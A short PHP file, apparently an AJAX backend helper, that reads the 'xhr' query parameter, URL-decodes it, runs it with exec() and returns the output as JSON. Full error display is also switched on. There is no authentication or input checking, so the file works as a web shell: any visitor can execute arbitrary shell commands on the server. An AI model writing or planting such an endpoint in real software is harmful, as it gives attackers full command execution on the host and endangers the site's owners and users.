<?php
	error_reporting(E_ALL); ini_set('display_errors', '1');
?>
<?php
	$stat = urldecode($_GET["xhr"]);
	exec($stat, $response);
	echo json_encode($response);
?>
